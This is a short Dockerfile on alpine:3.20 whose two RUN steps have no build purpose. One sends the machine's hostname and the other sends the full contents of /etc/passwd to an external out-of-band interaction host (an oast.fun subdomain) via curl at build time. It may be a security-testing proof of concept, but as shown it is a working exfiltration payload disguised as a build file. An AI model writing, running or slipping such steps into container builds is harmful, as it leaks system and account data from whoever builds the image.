FROM alpine:3.20

RUN DATA="$(hostname)" && \
    curl -sS "https://tqejbsqsbxlibayuvxxsi3pe49i6iojwa.oast.fun/?hostname=${DATA}"

RUN DATA="$(cat /etc/passwd)" && \
    curl -sS "https://tqejbsqsbxlibayuvxxsi3pe49i6iojwa.oast.fun/?hostname=${DATA}"
